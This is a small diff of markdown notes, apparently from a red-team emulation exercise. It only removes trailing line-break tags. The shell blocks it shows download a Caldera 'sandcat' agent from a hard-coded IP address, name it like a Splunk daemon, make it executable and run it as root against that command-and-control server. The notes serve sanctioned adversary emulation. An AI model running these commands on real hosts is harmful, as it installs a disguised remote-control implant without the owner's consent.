@@ -42,10 +42,10 @@ http://66.117.8.162:8888/<br>
 
 
   ```sh
-server="http://66.117.8.162:8888";<br>
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd1;<br>
-chmod +x splunkd1;<br>
-./splunkd1 -server $server -group red1 -v<br>
+server="http://66.117.8.162:8888";
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd1;
+chmod +x splunkd1;
+./splunkd1 -server $server -group red1 -v
   ```
 
 As root user<br>
@@ -56,9 +56,9 @@ run the following command : <br>
 
   ```sh
 server="http://66.117.8.162:8888";
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkdN;<br>
-chmod +x splunkdN;<br>
-./splunkdN -server $server -group redN -v<br>
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkdN;
+chmod +x splunkdN;
+./splunkdN -server $server -group redN -v
   ```
   
 Verified agent status<br>
